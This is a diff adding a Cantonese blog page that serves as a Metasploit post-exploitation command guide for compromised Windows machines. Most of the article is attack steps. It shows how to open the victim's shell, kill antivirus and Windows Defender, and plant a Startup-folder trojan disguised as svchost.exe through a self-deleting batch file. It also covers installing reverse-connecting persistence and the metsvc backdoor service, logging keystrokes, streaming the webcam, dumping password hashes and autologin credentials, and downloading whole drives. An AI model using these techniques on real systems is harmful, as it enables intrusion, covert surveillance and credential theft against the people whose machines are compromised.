@@ -1,0 +1,328 @@
+<!DOCTYPE html><html lang="zh-TW" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Metasploit - 指令列表 (Windows 機入侵後) | Halohalo :3</title><meta name="keywords" content="指令"><meta name="author" content="Halohalo"><meta name="copyright" content="Halohalo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="操作受害者 CMD 主控台當你成功入侵佢部機既時候，我地除左用原本 Metasploit 提供既指令之外，仲可以開返佢部機既 CMD 黎用。 1meterpreter &gt; execute -f cmd.exe -i -H 或者 1meterpreter &gt; shell  就可以用到佢部機既 cmd haha   如果你唔想再用佢部機既 cmd 你可以打 1C:\Windows\sy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit - 指令列表 (Windows 機入侵後)">
+<meta property="og:url" content="https://bmjvvhbuen9d7upw.github.io/2021/12/17/Metasploit-commands-HACKED/index.html">
+<meta property="og:site_name" content="Halohalo :3">
+<meta property="og:description" content="操作受害者 CMD 主控台當你成功入侵佢部機既時候，我地除左用原本 Metasploit 提供既指令之外，仲可以開返佢部機既 CMD 黎用。 1meterpreter &gt; execute -f cmd.exe -i -H 或者 1meterpreter &gt; shell  就可以用到佢部機既 cmd haha   如果你唔想再用佢部機既 cmd 你可以打 1C:\Windows\sy">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://bmjvvhbuen9d7upw.github.io/img/Post/image/Metasploit/cover.svg">
+<meta property="article:published_time" content="2021-12-17T13:01:21.000Z">
+<meta property="article:modified_time" content="2022-06-14T12:13:22.378Z">
+<meta property="article:author" content="Halohalo">
+<meta property="article:tag" content="指令">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bmjvvhbuen9d7upw.github.io/img/Post/image/Metasploit/cover.svg"><link rel="shortcut icon" href="/img/lala.png"><link rel="canonical" href="https://bmjvvhbuen9d7upw.github.io/2021/12/17/Metasploit-commands-HACKED/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查詢的內容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '複製成功',
+    error: '複製錯誤',
+    noSupport: '瀏覽器不支援'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '剛剛',
+    min: '分鐘前',
+    hour: '小時前',
+    day: '天前',
+    month: '個月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Metasploit - 指令列表 (Windows 機入侵後)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-06-14 20:13:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/lala.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">276</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">標籤</div><div class="length-num">87</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分類</div><div class="length-num">66</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Post</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><span> Linux</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Kali/"><span> Kali Linux</span></a></li><li><a class="site-page child" href="/categories/Arch-Linux/"><span> Arch Linux</span></a></li><li><a class="site-page child" href="/categories/Debian/"><span> Debian Linux</span></a></li><li><a class="site-page child" href="/categories/Manjaro/"><span> Manjaro Linux</span></a></li><li><a class="site-page child" href="/categories/Gnome/"><span> Gnome</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><span> Hacking</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Kali/"><span> Kali Linux</span></a></li><li><a class="site-page child" href="/categories/Metasploit/"><span> Metasploit</span></a></li><li><a class="site-page child" href="/categories/Reverse-engineering/"><span> Reverse Engineering</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><span> Programming</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Android-Studio/"><span> Android Studio</span></a></li><li><a class="site-page child" href="/tags/Python/"><span> Python</span></a></li><li><a class="site-page child" href="/tags/Java/"><span> Java</span></a></li><li><a class="site-page child" href="/tags/CSharp/"><span> C#</span></a></li><li><a class="site-page child" href="/tags/C/"><span> C++</span></a></li><li><a class="site-page child" href="/tags/Javascript/"><span> Javascript</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><span> Games</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Counter-Strike-1-6/"><span> Counter Strike 1.6</span></a></li><li><a class="site-page child" href="/categories/Counter-Strike-Global-Offensive/"><span> Counter-Strike Global Offensive</span></a></li><li><a class="site-page child" href="/categories/Minecraft/"><span> Minecraft</span></a></li><li><a class="site-page child" href="/categories/PS2-Games/"><span> PCSX2</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/nothing/"><i class="fa-fw fa fa-clipboard"></i><span> Todo</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/Post/image/Metasploit/top_img.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Halohalo :3</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Post</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><span> Linux</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Kali/"><span> Kali Linux</span></a></li><li><a class="site-page child" href="/categories/Arch-Linux/"><span> Arch Linux</span></a></li><li><a class="site-page child" href="/categories/Debian/"><span> Debian Linux</span></a></li><li><a class="site-page child" href="/categories/Manjaro/"><span> Manjaro Linux</span></a></li><li><a class="site-page child" href="/categories/Gnome/"><span> Gnome</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><span> Hacking</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Kali/"><span> Kali Linux</span></a></li><li><a class="site-page child" href="/categories/Metasploit/"><span> Metasploit</span></a></li><li><a class="site-page child" href="/categories/Reverse-engineering/"><span> Reverse Engineering</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><span> Programming</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Android-Studio/"><span> Android Studio</span></a></li><li><a class="site-page child" href="/tags/Python/"><span> Python</span></a></li><li><a class="site-page child" href="/tags/Java/"><span> Java</span></a></li><li><a class="site-page child" href="/tags/CSharp/"><span> C#</span></a></li><li><a class="site-page child" href="/tags/C/"><span> C++</span></a></li><li><a class="site-page child" href="/tags/Javascript/"><span> Javascript</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><span> Games</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Counter-Strike-1-6/"><span> Counter Strike 1.6</span></a></li><li><a class="site-page child" href="/categories/Counter-Strike-Global-Offensive/"><span> Counter-Strike Global Offensive</span></a></li><li><a class="site-page child" href="/categories/Minecraft/"><span> Minecraft</span></a></li><li><a class="site-page child" href="/categories/PS2-Games/"><span> PCSX2</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/nothing/"><i class="fa-fw fa fa-clipboard"></i><span> Todo</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Metasploit - 指令列表 (Windows 機入侵後)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">發表於</span><time class="post-meta-date-created" datetime="2021-12-17T13:01:21.000Z" title="發表於 2021-12-17 21:01:21">2021-12-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新於</span><time class="post-meta-date-updated" datetime="2022-06-14T12:13:22.378Z" title="更新於 2022-06-14 20:13:22">2022-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Metasploit/">Metasploit</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Metasploit/cover.svg" width="200px"/>
+
+<h2 id="操作受害者-CMD-主控台"><a href="#操作受害者-CMD-主控台" class="headerlink" title="操作受害者 CMD 主控台"></a>操作受害者 CMD 主控台</h2><p>當你成功入侵佢部機既時候，<br>我地除左用原本 Metasploit 提供既指令之外，<br>仲可以開返佢部機既 CMD 黎用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -f cmd.exe -i -H</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+
+<p>就可以用到佢部機既 <code>cmd</code> haha</p>
+
+
+<p>如果你唔想再用佢部機既 cmd 你可以打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;exit</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="終止防毒軟件"><a href="#終止防毒軟件" class="headerlink" title="終止防毒軟件"></a>終止防毒軟件</h2><p>我地用 Metasploit 內置既 功能 <code>killav.rb</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run killav.rb</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="停止-Windows-Defender-需要系統管理員身份"><a href="#停止-Windows-Defender-需要系統管理員身份" class="headerlink" title="停止 Windows Defender (需要系統管理員身份)"></a>停止 Windows Defender (需要系統管理員身份)</h2><p>首先我地要用佢個 <code>cmd</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+
+<p>再打</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc stop WinDefend</span><br></pre></td></tr></table></figure>
+
+<h2 id="生成持續性後門-方法一"><a href="#生成持續性後門-方法一" class="headerlink" title="生成持續性後門 (方法一)"></a>生成持續性後門 (方法一)</h2><p>建立持續性後門有兩種方法，一種係通過啟動項啟動(persistence) ，一種係通過服務啟動(metsvc)，<br>因為 meterpreter 係基於記憶體DLL建立連線，<br>所以，只要部機一熄，我地同佢既連線就會斷開。</p>
+<p>但係我地唔想每次連都要佢開file㗎嘛？<br>所以我地以下要做既野就係會令到每當佢部機一開就會自動開我地整出黎既木馬。</p>
+<h3 id="快速達成目標"><a href="#快速達成目標" class="headerlink" title="快速達成目標"></a>快速達成目標</h3><p>我地寫條 Script 快快手開完就可以達成目標。<br>原理係將你既檔案放入去Windows既 <code>Startup</code> 位置 咁樣只要佢一開部就會將你既 Trojan File 開啟.</p>
+<p>我地用 bat file，內容係打呢d</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> &quot;svchost.exe&quot; &quot;C:\Users\<span class="variable">%username%</span>\AppData\Roaming\Microsoft\Windows\<span class="built_in">Start</span> Menu\Programs\Startup\&quot;</span><br><span class="line"><span class="built_in">start</span> C:\Users\<span class="variable">%username%</span>\AppData\Roaming\Microsoft\Windows\&quot;<span class="built_in">Start</span> Menu&quot;\Programs\Startup\svchost.exe</span><br><span class="line"><span class="built_in">del</span> %<span class="number">0</span></span><br><span class="line"><span class="built_in">del</span> svchost.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="兩句既意思係"><a href="#兩句既意思係" class="headerlink" title="兩句既意思係"></a>兩句既意思係</h4><ul>
+<li>第一行係解 copy 一個file 去 Windows既 <code>Startup</code> 位置</li>
+<li>第二行係解去呢個 Winodws 既 Paths 開呢個 file</li>
+<li>第三行係解當你上面個兩句運行完就會將你既而加開既呢個 batch file delete.</li>
+<li>第四行係解當你上面個兩句運行完就會將而加呢個位置個個 exe file delete.</li>
+</ul>
+<p>完成哂之後我去就去返 <code>meterpreter</code> 再打</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run persistence -X -i [Second] -p [Port Number] -r [Host Number]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 設置後門在系統啟動後自啟動。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 該方式會在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加註冊表信息。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 由於權限問題，會導致添加失敗，後門將無法啟動，因此，在非管理員權限或者未進行BypassUAC操作情況下，不推薦使用該參數。</span></span><br></pre></td></tr></table></figure>
+
+<p>or </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run persistence -U -i [Second] -p [Port Number] -r [Host Number]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 設置後門在用戶登錄後自啟動。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 該方式會在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加註冊表信息，推薦使用該參數；</span> </span><br></pre></td></tr></table></figure>
+
+<p>成句意思就係每五秒會自動連上 你既 [Host Number] 既 [Port Number]<br>之後就會喺目標既機度自動 gen 個 vbs file，<br>再將佢入落去 Regedit (登錄檔)，只要佢一開機就會自己開。</p>
+<ul>
+<li><p>-P：設置Payload，默認為windows/meterpreter/reverse_tcp。<br>該默認的payload生成的後門為32位程序。<br>因此，當目標機器為64位系統時，留下的後門將無法運行；</p>
+</li>
+<li><p>-U：設置後門在用戶登錄後自啟動。<br>該方式會在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加註冊表信息，推薦使用該參數。</p>
+</li>
+<li><p>-X：設置後門在系統啟動後自啟動。<br>該方式會在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加註冊表信息。<br>由於權限問題，會導致添加失敗，後門將無法啟動。<br>因此，在非管理員權限或者未進行BypassUAC操作情況下，不推薦使用該參數。</p>
+</li>
+<li><p>-i：設置反向連接間隔時間，單位為秒，當設置該參數後，目標機器會每隔設置的時間回連一次所設置的ip</p>
+</li>
+<li><p>-p：設置反向連接的端口號。即等待連接的端口；</p>
+</li>
+<li><p>-r：設置反向連接的ip地址。即等待連接的ip； </p>
+</li>
+</ul>
+<h2 id="生成持續性後門-方法二，加入服務-需要系統官理員"><a href="#生成持續性後門-方法二，加入服務-需要系統官理員" class="headerlink" title="生成持續性後門 (方法二，加入服務 [需要系統官理員])"></a>生成持續性後門 (方法二，加入服務 [需要系統官理員])</h2><p>利用 metsvc 喺目標主機度安裝 Meterpreter 既服務，<br>當佢開機既時候就會自動開啟。</p>
+<h3 id="安裝-metsvc-方法一"><a href="#安裝-metsvc-方法一" class="headerlink" title="安裝 metsvc (方法一)"></a>安裝 metsvc (方法一)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\WYPiyqkOsJZS...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">	 * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>
+
+<h3 id="安裝-metsvc-方法二"><a href="#安裝-metsvc-方法二" class="headerlink" title="安裝 metsvc (方法二)"></a>安裝 metsvc (方法二)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\WYPiyqkOsJZS...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">	 * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>
+
+<h3 id="解除安裝-metsvc"><a href="#解除安裝-metsvc" class="headerlink" title="解除安裝 metsvc"></a>解除安裝 metsvc</h3><p>解除安裝就打 <code>run metsvc -r</code> </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -r</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Removing the existing Meterpreter service</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\KRUyRiAody...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Stopping the service...</span><br><span class="line">	 * Stopping service metsvc</span><br><span class="line"> * Removing service</span><br><span class="line">Service metsvc successfully removed.</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="更多指令"><a href="#更多指令" class="headerlink" title="更多指令"></a>更多指令</h1><p>入返去 <code>meterpreter</code> 打help</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             <span class="built_in">Help</span> menu</span><br><span class="line">    background    Backgrounds the current session</span><br><span class="line">    channel       Displays information about active channels</span><br><span class="line">...<span class="built_in">more</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="常用指令-入侵後"><a href="#常用指令-入侵後" class="headerlink" title="常用指令 (入侵後)"></a>常用指令 (入侵後)</h1><ul>
+<li>reboot 重開條友部機</li>
+<li>shutdown 熄鳩條友部機</li>
+<li>help 所有指令</li>
+<li>uictl 控制佢 Keyboard Mouse 既 開關</li>
+<li>ls 列出呢個Paths既 Files Folder</li>
+<li>cd 進入</li>
+<li>ps 列出佢開緊啲乜Program</li>
+<li>screenshare 直播佢部機既畫面</li>
+<li>screenshot Cap佢部機而加既畫面</li>
+<li>mouse 控制佢部機而加既 x y 坐標</li>
+<li>keyscan_start 開始 Capturing 佢Keyboard撳過d乜制</li>
+<li>keyscan_dump 攞你 Capturing 到既 Key</li>
+<li>keyscan_stop 停止 Captring Keyboard</li>
+<li>keyevent 發送鍵盤文字</li>
+<li>sysinfo 攞佢呢部機而加既系統資料</li>
+<li>suspend 停鳩佢某程式既控制</li>
+<li>shell 用cmd</li>
+<li>webcam_stream 佢如果有webcam 就直播佢webcam (需要有Browser)</li>
+<li>load 載入套件</li>
+<li>migrate 將程式移動特定 Process (Inject)</li>
+<li>download 下載檔案</li>
+</ul>
+<h2 id="常用指令格式-入侵後"><a href="#常用指令格式-入侵後" class="headerlink" title="常用指令格式 (入侵後)"></a>常用指令格式 (入侵後)</h2><p>download 佢既 File (下載既Mount 預設會係佢開你呢個 Trojan既 mount)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download filename.type</span><br></pre></td></tr></table></figure>
+
+<p>將人地成個 mount 既 file 下載 (指定 Mount)</p>
+<p>打 <code>show_mount</code> 查下佢有乜 <code>mount</code></p>
+<p>查到之後打</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download e:\\ <span class="comment"># 下載成個 e mount 既 File (有啲file 要有 Admin 權限先 Downlaod到)</span></span><br><span class="line">download * <span class="comment">#下載所有你目前位置既所有 File</span></span><br></pre></td></tr></table></figure>
+
+<p>就咁一個file</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download e:\\hi.txt</span><br></pre></td></tr></table></figure>
+
+<p>cd 去其他 Mount</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd e: #入 e mount</span><br><span class="line">cd d: #入 d mount</span><br></pre></td></tr></table></figure>
+
+
+
+<p>…. 仲有好多 但係我已經懶得打- - 大家可以自己打 <code>help</code> 查下 @@</p>
+<h1 id="常用使用滲透模組-入侵後"><a href="#常用使用滲透模組-入侵後" class="headerlink" title="常用使用滲透模組 (入侵後)"></a>常用使用滲透模組 (入侵後)</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate #程式自動遷移</span><br><span class="line">run post/windows/gather/checkvm #檢視目標主機是否執行在虛擬機器上 查部機係咪行緊 VM</span><br><span class="line">run post/windows/manage/killav #關閉防毒軟體 熄撚左佢個防毒(AV)</span><br><span class="line">run post/windows/manage/enable_rdp #開啟遠端桌面服務 (幫佢開返rdp [遠端桌面服務])</span><br><span class="line">run post/windows/manage/autoroute #睇下Route資料</span><br><span class="line">run post/windows/gather/enum_logged_on_users #列出而加登入左既用戶資料</span><br><span class="line">run post/windows/gather/enum_applications #列出應用程式</span><br><span class="line">run windows/gather/credentials/windows_autologin #攞自動登入既使用者名稱同密碼</span><br><span class="line">run windows/gather/smart_hashdump #dump出所有使用者既hash</span><br><span class="line">run killav.rb # 殺死防毒(AV)</span><br><span class="line">run post/windows/capture/keylog_recorder #使用Keylogger 記錄鍵盤操作</span><br></pre></td></tr></table></figure>
+
+<h1 id="查-Module"><a href="#查-Module" class="headerlink" title="查 Module"></a>查 Module</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search post/windows</span><br></pre></td></tr></table></figure>
+
+<p>參考資料 :<br><a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-backdoor/">https://www.offensive-security.com/metasploit-unleashed/meterpreter-backdoor/</a></p>
